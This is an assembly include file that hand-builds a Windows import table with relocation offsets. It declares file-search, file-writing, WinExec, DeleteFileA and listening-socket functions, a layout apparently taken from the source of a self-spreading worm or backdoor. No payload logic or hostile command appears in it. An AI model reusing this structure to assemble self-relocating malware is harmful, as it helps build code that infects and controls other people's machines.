import_start equ $

%define ordinal 80000000h

api_list001 equ $
api001  dd str001+RVADIFF
api002	dd str002+RVADIFF
%ifdef  MULTITHREAD
api003	dd str003+RVADIFF
%endif
api004	dd str004+RVADIFF
api005	dd str005+RVADIFF
api006	dd str006+RVADIFF
api007	dd str007+RVADIFF
api008	dd str008+RVADIFF
api009	dd str009+RVADIFF
api010	dd str010+RVADIFF
api011	dd str011+RVADIFF
api012	dd str012+RVADIFF
api013	dd str013+RVADIFF
;	dd 0

import	dd 0
	dd 0
	dd -1
	dd dll_name001+RVADIFF
	dd api_list001+RVADIFF

	dd 0
	dd 0
	dd -1
	dd dll_name002+RVADIFF
	dd api_list002+RVADIFF

	dd 0
	dd 0
	dd -1
	dd dll_name003+RVADIFF
	dd api_list003+RVADIFF

nul_entry times 5 dd 0

api_list002 equ $
api014	dd ordinal+115		        ;WSAStartup
api015	dd ordinal+23 		        ;socket
api016	dd ordinal+2  		        ;bind
api017	dd ordinal+13 		        ;listen
api018	dd ordinal+1  		        ;accept
api019	dd ordinal+4  		        ;connect
api020	dd ordinal+18 		        ;select
api021	dd ordinal+19 		        ;send
api022	dd ordinal+16 		        ;recv
api023	dd ordinal+3  		        ;closesocket
api024	dd ordinal+116		        ;WSACleanup
api025	dd ordinal+57		        ;gethostname
api026	dd ordinal+52		        ;gethostbyname
dw 0			        ;dd 0

str027	dw 0
	db "wsprintfA"
str028	dw 0
	db "PeekMessageA",0

api_list003 equ $
api027  dd str027+RVADIFF
api028  dd str028+RVADIFF
	dw 0                            ;dd 0

str001	dw 0
	db "SetCurrentDirectoryA"
str002	dw 0
	db "ExitProcess"
%ifdef  MULTITHREAD
str003	dw 0
	db "CreateThread"
%endif
str004	dw 0
	db "DeleteFileA"
str005	dw 0
	db "WinExec"
str006	dw 0
	db "FindFirstFileA"
str007	dw 0
	db "FindNextFileA"
str008	dw 0
	db "FindClose"
str009	dw 0
	db "CreateFileA"
str010	dw 0
	db "CloseHandle"
str011	dw 0
	db "ReadFile"
str012	dw 0
	db "WriteFile"
str013	dw 0
	db "SetFilePointer"
        db 0

dll_name001 db "KERNEL32.DLL",0
dll_name002 db "WS2_32.DLL",0
dll_name003 db "USER32.DLL",0

SetCurrentDirectoryA equ api001+reloc
ExitProcess	equ api002+reloc
%ifdef  MULTITHREAD
CreateThread	equ api003+reloc
%endif
DeleteFileA	equ api004+reloc
WinExec		equ api005+reloc
FindFirstFileA	equ api006+reloc
FindNextFileA	equ api007+reloc
FindClose	equ api008+reloc
CreateFileA	equ api009+reloc
CloseHandle	equ api010+reloc
ReadFile	equ api011+reloc
WriteFile	equ api012+reloc
SetFilePointer  equ api013+reloc

WSAStartup  	equ api014+reloc
socket          equ api015+reloc
bind        	equ api016+reloc
listen          equ api017+reloc
accept      	equ api018+reloc
connect         equ api019+reloc
select      	equ api020+reloc
send            equ api021+reloc
recv        	equ api022+reloc
closesocket     equ api023+reloc
WSACleanup      equ api024+reloc
gethostname     equ api025+reloc
gethostbyname   equ api026+reloc

wsprintfA	equ api027+reloc
PeekMessageA	equ api028+reloc

import_end equ $
